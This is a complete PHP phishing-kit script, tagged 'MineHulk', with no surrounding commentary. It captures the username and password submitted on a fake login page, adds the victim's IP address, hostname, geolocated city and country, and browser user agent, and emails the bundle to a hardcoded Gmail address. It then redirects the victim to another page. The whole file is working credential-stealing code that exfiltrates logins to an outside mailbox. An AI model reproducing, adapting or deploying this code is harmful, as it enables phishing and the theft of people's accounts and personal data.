<?php

$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$adddate=date("D M d, Y g:i a");
$message .= "----------------------------MineHulk\n";
$message .= "Username: ".$_POST['login']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date: ".$adddate."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";

$message .= "--------------------------MineHulk\n";

$recipient = "emmygatundu65@gmail.com";
$subject = "$ip";
$headers = "From: OFFBox";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: index3.php");

	   }


?>